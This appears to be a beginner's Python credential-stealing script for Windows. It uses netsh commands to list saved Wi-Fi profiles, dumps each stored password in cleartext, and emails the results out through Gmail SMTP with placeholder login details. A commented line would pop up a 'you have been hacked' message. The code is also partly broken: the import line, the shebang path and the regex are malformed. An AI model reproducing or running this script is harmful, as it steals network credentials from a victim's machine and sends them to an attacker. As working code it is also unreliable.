#!/user/bin/python

import subprocess, smtplib. re

# command = "msg * you have been hacked"
# subprocess.Popen(command, shell=True)

# netsh wlan show profile
# netsh wlan show profile [Access Point]
# netsh wlan show profile [Access Point] key=clear

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    # creates instant SMTP server
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
    # allow less secure apps on gmail

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?Profile\s*:\s)(.*)", networks)
# print(network_names.group(0)) ? to remove unnecessary part
# print(network_names_list.group(1))

result = ""

for network_name in network_names_list:
    # print(network_name)
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

send_mail("asdf@gmail.com", "pass", result)
